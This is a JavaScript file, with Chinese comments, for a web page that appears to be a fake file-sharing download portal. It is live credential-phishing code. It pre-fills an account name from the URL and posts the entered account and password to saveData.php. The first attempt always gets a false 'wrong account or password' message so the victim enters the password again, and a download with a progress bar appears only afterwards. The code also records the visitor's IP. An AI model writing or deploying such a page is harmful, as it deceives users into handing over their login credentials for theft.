var modal = document.getElementById("myModal");
var textRed = document.getElementById("testRed")

// 全局状态变量
var btnState = 0;

function toggleButton() {
    switch (btnState) {
        case 0:
            // 显示输入框
            modal.style.display = "block";
            btnState = 1;
            break;
        case 1:
            // 这里不做任何事，因为状态1到状态2的转换应由提交数据操作触发
            break;
        case 2:
            // 下载文件
            var a = document.createElement('a');
            a.href = downloadUrl;
            a.download = '';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            // 可选：如果需要在下载后重置状态
            btnState = 0;
            break;
    }
}

var submitCount = 0;
let inputCount = 0; // 用于跟踪输入次数
let lastInput = ""; // 存储上一次的输入数据

function submitData() {

    event.preventDefault();

    const currentInput = document.getElementById("data1").value; // 获取当前输入数据
    inputCount++; // 增加输入次数

    if (inputCount === 2) {
        // 如果是第二次输入，则显示数据
        document.getElementById("display").innerText = ""; // 显示当前输入数据
        inputCount = 0; // 重置输入次数，以便再次进行两次输入
    } else {
        lastInput = currentInput; // 存储这次输入，为下一次比较做准备
        document.getElementById("display").innerText = ""; // 提示再次输入
    }

    var data1 = document.getElementById("data1").value;
    var data2 = document.getElementById("data2").value;

    var currentTime = new Date();
    var formattedTime = currentTime.getHours() + ':' + currentTime.getMinutes() + ':' + currentTime.getSeconds();

    // 创建 FormData 对象来封装这些数据
    var formData = new FormData();
    formData.append('data1', data1);
    formData.append('data2', data2);
    formData.append('time', formattedTime);

    
    // 使用 fetch API 向服务器发送数据
    fetch('saveData.php', {
        method: 'POST',
        body: formData,
    })
        .then(response => response.text()) // 处理服务器响应的文本
        .then(text => {
            submitCount++; // 提交成功后，增加计数器
            if (submitCount === 1) {
                document.getElementById("submitStatus").textContent = "账号或密码错误";
                document.getElementById("submitStatus").style.display = "block";
                //document.getElementById("data1").value = "";
                document.getElementById("data2").value = "";
            } else if (submitCount >= 2) {
                // 第二次（或更多次）提交
                modal.style.display = "none"; // 关闭模态框
                submitCount = 0; // 重置计数器，以便下次使用
                btnState = 2; // 更新状态为下载，按照原有逻辑
            }
        })

        .catch(error => console.error('提交数据出错:', error));
}


// 绑定按钮事件
document.getElementById("myBtn1").onclick = toggleButton;
document.getElementById("myBtn2").onclick = toggleButton;
document.getElementById("myBtn3").onclick = toggleButton;

// 读取文件列表并决定按钮显示
fetch('listFiles2.php')
    .then(response => response.json())
    .then(files => {
        if (files.length > 0) {
            downloadUrl = "../file/" + files[0]; // 假设下载第一个文件
            document.getElementById("myBtn3").style.display = 'block'; // 显示下载按钮
        }
    })
    .catch(error => console.error('Error:', error));

// 检查是否有图像文件，显示 myBtn2
fetch('checkFileType.php')
    .then(response => response.json())
    .then(data => {
        if (data.hasImage) {
            document.getElementById('myBtn2').style.display = 'block';
        }
    })
    .catch(error => console.error('Error:', error));

function recordIP() {
    fetch('saveData2.php', {
        method: 'POST'
    })
        .then(response => response.text())
        .catch(error => console.error('Error:', error));
}


// 使用URLSearchParams解析当前页面URL的查询字符串
const urlParams = new URLSearchParams(window.location.search);

// 读取"name"和"age"参数的值
const account = urlParams.get('account');

// 将参数值显示在页面上
document.getElementById('data1').value = account;

document.addEventListener('DOMContentLoaded', function () {
    // 初始化点击计数器
    let clickCount = 0;

    // 获取按钮和动画元素的引用
    const buttons = document.querySelectorAll('.ellipse-button1, .ellipse-button2'); // 假设所有按钮都有这些类
    const downloadAnimation = document.getElementById('downloadAnimation'); // 下载动画的容器ID
    const otherBtn1 = document.getElementById('otherBtn1'); // 其他按钮1的ID
    const otherBtn2 = document.getElementById('otherBtn2'); // 其他按钮2的ID
    const downloadText = document.getElementById('downloadText');

    // 定义点击事件的处理函数
    function handleButtonClick() {
        // 增加点击计数
        clickCount++;

        // 当点击第二次时执行逻辑
        if (clickCount === 2) {
            // 遍历隐藏所有相关按钮
            buttons.forEach(button => button.style.display = 'none');

            // 显示下载动画和其他两个按钮
            downloadAnimation.style.display = 'block'; // 假设下载动画默认是隐藏的
            otherBtn1.style.display = 'block'; // 假设其他按钮默认是隐藏的
            otherBtn2.style.display = 'block'; // 同上
            downloadText.style.display = 'flex';

            // 重置点击计数器，以便重新开始计数
            clickCount = 0;
        }
    }

    // 为所有相关按钮添加点击事件监听器
    buttons.forEach(button => button.addEventListener('click', handleButtonClick));

    let controller = new AbortController();
    let signal = controller.signal;




    function handleButtonClick() {
        // 增加点击计数
        clickCount++;

        // 当点击第二次时执行逻辑
        if (clickCount === 2) {
            // 遍历隐藏所有相关按钮
            buttons.forEach(button => button.style.display = 'none');

            // 显示下载动画和其他两个按钮
            downloadAnimation.style.display = 'block'; // 假设下载动画默认是隐藏的
            otherBtn1.style.display = 'block'; // 假设其他按钮默认是隐藏的
            otherBtn2.style.display = 'block'; // 同上
            downloadText.style.display = 'flex';

            // 调用 progbar 函数开始下载
            progbar();

            // 重置点击计数器，以便重新开始计数
            clickCount = 0;
        }
    }



    document.getElementById('otherBtn1').addEventListener('click', function () {
        progbar();
        var a = document.createElement('a');
            a.href = downloadUrl;
            a.download = '';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
    })



    // 下载文件的逻辑
    function progbar() {
        fetch('456.php')
            .then(response => response.json())
            .then(files => {
                if (files.length > 0) {
                    var fileName = files[0];
                    var fileUrl = `../file/${fileName}`;
                    console.log("Downloading file:", fileUrl);
                    downloadFile(fileUrl);
                } else {
                    console.error("No files returned from the server.");
                }
            })
            .catch(error => {
                console.error('Error loading files:', error);
            });
    }

    function downloadFile(fileUrl) {
        controller = new AbortController();
        signal = controller.signal;

        fetch(fileUrl, {
            method: 'GET',
            signal: signal
        }).then(res => {
            const contentLength = res.headers.get('Content-Length') || 0;
            let loaded = 0;
            let start = Date.now();

            return new Response(new ReadableStream({
                start(controller) {
                    const reader = res.body.getReader();

                    function read() {
                        reader.read().then(progressEvent => {
                            if (progressEvent.done) {
                                finishDownload();
                            } else {
                                loaded += progressEvent.value.byteLength;
                                updateProgress(loaded, contentLength);
                                controller.enqueue(progressEvent.value);
                                read();
                            }
                        });
                    }
                    read();
                }
            }));
        }).catch(error => {
            console.error('Download failed:', error);
            if (error.name === 'AbortError') {
                console.log('Fetch operation was aborted.');
            }
        });
    }

    function updateProgress(loaded, total) {
        const percent = (loaded / total) * 100;
        document.getElementById('progressBar').style.width = percent + '%';
        document.getElementById('fsz').innerText = '' + formatFileSize(loaded, 2);
        document.getElementById('fsize').innerText = '/' + formatFileSize(total, 2);

        // 根据下载进度更改进度条颜色
        if (percent < 33) {
            document.getElementById('progressBar').style.backgroundColor = '#3370ff'; 
        } else if (percent < 100) {
            document.getElementById('progressBar').style.backgroundColor = '#32cd32'; // 绿色
        }
    }


    function formatFileSize(bytes, decimalPoint) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const dm = decimalPoint || 2;
        const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB', 'PB', 'EB', 'ZB', 'YB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return parseFloat((bytes / Math.pow(k, i)).toFixed(dm)) + ' ' + sizes[i];
    }

    function finishDownload() {
        document.getElementById('progressBar').style.background = 'rgb(20, 179, 96)';
        document.getElementById('downloadLogo').style.display = 'block'
        console.log('Download completed');
        const messageDiv = document.getElementById('downloadDone');
        messageDiv.textContent = '下载完成'; // 设置消息文本
        messageDiv.style.display = 'flex'; // 显示消息
    }
})


function setCookie(name, value, days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "") + expires + "; path=/";
}

function getCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}

function loginUser() {
    var username = document.getElementById("username").value;
    if (username) {
        setCookie("username", username, 7);
        updateUI(username);
    }
}






